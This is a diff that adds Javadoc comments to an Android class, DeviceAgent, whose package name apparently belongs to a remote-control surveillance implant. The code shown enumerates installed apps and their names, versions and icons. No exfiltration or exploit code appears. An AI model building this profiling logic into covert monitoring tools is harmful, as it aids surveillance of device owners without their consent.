@@ -41,6 +41,7 @@ import com.ht.RCSAndroidGUI.utils.WChar;
  */
 public class DeviceAgent extends AgentBase {
 
+	/** The Constant TAG. */
 	public static final String TAG = "DeviceAgent";
 
 	/** The process list. */
@@ -188,13 +189,29 @@ public class DeviceAgent extends AgentBase {
 
 	}
 
+	/**
+	 * The Class PInfo.
+	 */
 	class PInfo {
+		
+		/** The appname. */
 		private String appname = "";
+		
+		/** The pname. */
 		private String pname = "";
+		
+		/** The version name. */
 		private String versionName = "";
+		
+		/** The version code. */
 		private int versionCode = 0;
+		
+		/** The icon. */
 		private Drawable icon;
 
+		/* (non-Javadoc)
+		 * @see java.lang.Object#toString()
+		 */
 		@Override
 		public String toString() {
 			return appname + "\t" + pname + "\t" + versionName + "\t"
@@ -203,6 +220,11 @@ public class DeviceAgent extends AgentBase {
 
 	}
 
+	/**
+	 * Gets the packages.
+	 *
+	 * @return the packages
+	 */
 	private ArrayList<PInfo> getPackages() {
 		final ArrayList<PInfo> apps = getInstalledApps(false); /*
 																 * false = no
@@ -216,6 +238,12 @@ public class DeviceAgent extends AgentBase {
 		return apps;
 	}
 
+	/**
+	 * Gets the installed apps.
+	 *
+	 * @param getSysPackages the get sys packages
+	 * @return the installed apps
+	 */
 	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
 		final ArrayList<PInfo> res = new ArrayList<PInfo>();
 		final PackageManager packageManager = Status.getAppContext()
